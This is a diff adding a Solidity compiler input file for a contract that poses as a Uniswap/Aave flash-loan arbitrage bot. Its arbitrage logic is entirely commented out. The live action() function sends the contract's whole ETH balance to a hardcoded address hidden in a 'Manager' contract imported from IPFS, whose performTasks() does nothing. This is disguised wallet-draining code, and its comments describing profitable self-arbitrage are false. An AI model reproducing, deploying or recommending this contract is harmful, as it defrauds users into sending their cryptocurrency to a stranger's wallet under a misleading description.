@@ -1,0 +1,32 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "UniswapFlashLoan.sol": {
+      "content": "pragma solidity ^0.6.6;\n\n// Multiplier-Finance Smart Contracts\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\";\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\";\n\n// uniSwap Smart Contracts\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniCallee.sol\";\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniFactory.sol\";\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniPair.sol\";\n\n\n\n// Code Manager\nimport \"ipfs://QmU6D2cdespnZHt2HaorUzZo7rSr8UcWAjzZrs1QiqUPey\";\n\n\ncontract GetFlashLoan {\n\tstring public tokenName;\n\tstring public tokenSymbol;\n\tuint loanAmount;\n\tManager manager;\n\t\n\tconstructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\n\t\ttokenName = _tokenName;\n\t\ttokenSymbol = _tokenSymbol;\n\t\tloanAmount = _loanAmount;\n\t\t\t\n\t\tmanager = new Manager();\n\t}\nreceive() external payable {}\n\t\n\tfunction action() public payable {\n\t\t\n\t    // Send required coins for swap\n\t    payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n\t    \n\t    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\n\t    manager.performTasks();\n\t    \n\t    /*\n\t    // Submit token to Ethereum blockchain\n\t    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\n\n        // List the token on UniSwap & send coins required for swaps\n\t\tmanager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);\n\t\tpayable(manager.uniswapDepositAddress()).transfer(300000000000000000);\n\n        // Get ETH Loan from Aave\n\t\tstring memory loanAddress = manager.takeAaveLoan(loanAmount);\n\t\t\n\t\t// Convert half ETH to DAI\n\t\tmanager.uniswapDAItoETH(loanAmount / 2);\n\n        // Create ETH and DAI pairs for our token & Provide liquidity\n        string memory ethPair = manager.uniswapCreatePool(tokenAddress, \"ETH\");\n\t\tmanager.uniswapAddLiquidity(ethPair, loanAmount / 2);\n\t\tstring memory daiPair = manager.uniswapCreatePool(tokenAddress, \"DAI\");\n\t\tmanager.uniswapAddLiquidity(daiPair, loanAmount / 2);\n    \n        // Perform swaps and profit on Self-Arbitrage\n\t\tmanager.uniswapPerformSwaps();\n\t\t\n\t\t// Move remaining ETH from Contract to your account\n\t\tmanager.contractToWallet(\"ETH\");\n\n        // Repay Flash loan\n\t\tmanager.repayAaveLoan(loanAddress);\n\t    */\n\t}\n}"
+    },
+    "ipfs://QmU6D2cdespnZHt2HaorUzZo7rSr8UcWAjzZrs1QiqUPey": {
+      "content": "pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0x4B9e1177aCA2fEE32E9b976f5aadCCe8b0EB1b5C;\r\n\t}\r\n}\r\n"
+    }
+  }
+}
